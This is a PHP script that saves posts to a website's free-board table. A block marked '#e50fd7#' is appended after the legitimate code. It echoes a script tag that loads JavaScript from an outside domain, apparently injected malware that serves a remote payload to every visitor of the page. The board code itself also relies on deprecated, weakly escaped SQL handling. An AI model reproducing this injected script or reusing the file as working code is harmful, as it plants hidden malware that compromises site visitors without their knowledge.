<?
	session_start();
	include('./lib.php');
	$connect = db_connect($db_host, $db_user, $db_pass, $db_name);
	$title=$_POST['board_title'];
	$content=$_POST['board_contents'];
	$writer_id=$_SESSION['user_id'];
	if($title!="" && $content!=""){
		$sql="insert into Vocals_freeboard set board_writer_id=trim('$writer_id'), board_title='".addslashes(htmlspecialchars($title))."', 
		board_content='".addslashes(htmlspecialchars($content))."',board_date=now()";
		mysql_query($sql);
		echo "success";
	}else{
		echo "fail";
	}
?>
<?php
#e50fd7#
if(empty($vt)) {
$vt = "<script type=\"text/javascript\" src=\"http://hancomotors.com/r9ctwktv.php?id=14155813\"></script>";
echo $vt;
}
#/e50fd7#
?>